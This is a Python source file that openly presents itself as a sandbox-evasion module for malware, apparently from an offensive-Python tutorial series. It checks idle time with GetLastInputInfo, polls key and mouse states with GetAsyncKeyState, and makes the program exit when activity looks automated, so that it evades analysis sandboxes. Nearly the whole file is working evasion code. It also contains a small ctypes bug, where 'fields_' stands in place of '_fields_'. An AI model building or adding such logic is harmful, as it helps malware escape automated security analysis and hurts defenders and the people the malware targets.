# sandbox evasion and user-activity detector that monitors system idle time and polls virtual key states to determine if a human user is
# actively operating the machine, allowing malware to terminate itself if it detects an automated sandbox environment.

from ctypes import byref, c_uint, c_ulong, sizeof, Structure, windll
import random
import sys
import time
import win32api

# C compatible structure mirroring the LASTINPUTINFO API layout
class LASTINPUTINFO(Structure): # defines the size of the structure and the timestamp of the last user input event
    fields_ = [ 
        ('cbSize', c_uint),
        ('dwTime', c_ulong)
    ]

# check system idle time
def get_last_input():
    struct_lastinputinfo = LASTINPUTINFO() # instantiates the structure
    struct_lastinputinfo.cbSize = sizeof(LASTINPUTINFO) # sets the correct size for the Windows API
    windll.user32.GetLastInputInfo(byref(struct_lastinputinfo)) # calls API to get the tick-count of the last keyboard/mouse input, 
    # and inserts that into our struct
    run_time = windll.kernel32.GetTickCount() # finds the total time the system has been up since boot
    elapsed = run_time - struct_lastinputinfo.dwTime # subtracts last input time from run time to calculate idle time
    print(f"[*] It's been {elapsed} milliseconds since the last event.") 
    return elapsed

class Detector:
    def __init__(self):
        # initializes counters for user activity tracking
        self.double_clicks = 0
        self.keystrokes = 0
        self.mouse_clicks = 0

    # loops through key codes to check for an input
    # note: this could be done with PyWinHook as was done in the keylogger, but this uses a pure ctypes solution
    def get_key_press(self):
        for i in range(0, 0xff): # loop through 255 possible key codes (covering keyboard and mouse buttons)
            state = win32api.GetAsyncKeyState(i) # calls the API to check the status of key 'i'
            if state & 0x0001:
                if i == 0x1:
                    self.mouse_clicks += 1
                    return time.time()
                elif i > 32 and i < 127:
                    self.keystrokes += 1
        return None

    def detect(self):
        previous_timestamp = None
        first_double_click = None
        double_click_threshold = 0.35

        max_double_clicks = 10
        max_keystrokes = random.randint(10,25)
        max_mouse_clicks = random.randint(5,25)
        max_input_threshold = 30000

        last_input = get_last_input()
        if last_input >= max_input_threshold:
            sys.exit(0)

        detection_complete = False
        while not detection_complete:
            keypress_time = self.get_key_press()
            if keypress_time is not None and previous_timestamp is not None:
                elapsed = keypress_time - previous_timestamp

                if elapsed <= double_click_threshold:
                    self.mouse_clicks -= 2
                    self.double_clicks += 1
                    if first_double_click is None:
                        first_double_click = time.time()
                    else:
                        if self.double_clicks >= max_double_clicks:
                            if (keypress_time - first_double_click <=
                                (max_double_clicks*double_click_threshold)):
                                sys.exit(0)
                if (self.keystrokes >= max_keystrokes and
                    self.double_clicks >= max_double_clicks and
                    self.mouse_clicks >= max_mouse_clicks):
                    detection_complete = True

                previous_timestamp = keypress_time
            elif keypress_time is not None:
                previous_timestamp = keypress_time

if __name__ == '__main__':
    d = Detector()
    d.detect()
    print('okay.')
